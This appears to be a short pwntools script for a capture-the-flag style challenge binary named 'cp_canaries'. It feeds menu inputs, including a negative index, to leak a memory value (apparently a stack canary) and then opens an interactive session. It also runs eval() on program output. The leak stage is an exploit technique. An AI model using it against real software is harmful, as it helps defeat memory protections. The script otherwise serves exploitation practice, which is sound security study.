from pwn import *


elf = context.binary = ELF("cp_canaries")
p = process()


p.sendline("0")
p.sendline("")

p.sendline("2")
# gdb.attach(p)
p.sendline("-3")

p.recvuntil("weight: ")
leak = eval(p.recvline())
print(hex(leak))

p.interactive()